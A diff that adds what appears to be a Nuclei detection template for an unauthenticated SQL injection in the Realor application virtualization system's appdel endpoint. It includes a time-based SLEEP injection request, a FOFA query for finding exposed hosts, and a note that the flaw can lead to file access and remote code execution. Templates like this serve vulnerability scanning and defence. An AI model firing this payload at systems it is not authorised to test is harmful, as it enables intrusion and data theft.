@@ -1,0 +1,27 @@
+id: realor-appdel-sqli
+
+info:
+  name: Realor appdel - SQL Injection
+  author: Co5mos
+  severity: high
+  description: |
+    Realor Application Virtualization System's /Home/Controller/AdminController contains two interfaces, appsave and appdel, which do not require authentication and are vulnerable to SQL injection. Unauthorized attackers can exploit this vulnerability to obtain sensitive information. As the default configuration does not restrict the MySQL write file path through secure_file_priv, attackers can exploit this vulnerability to read and write any local file, thereby executing arbitrary code remotely.
+  reference:
+    - https://mp.weixin.qq.com/s/S8I2SIqzl_npSjWIqtru2Q
+  metadata:
+    fofa-query: app="REALOR-天翼应用虚拟化系统"
+  tags: realor,sqli
+
+http:
+  - raw:
+      - |
+        @timeout: 10s
+        GET /hmrao.php?s=/Admin/appdel&list=1')%20AND(SELECT%201%20FROM%20(SELECT(SLEEP(4)))a)AND('1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=4'
+          - 'status_code == 200'
+        condition: and
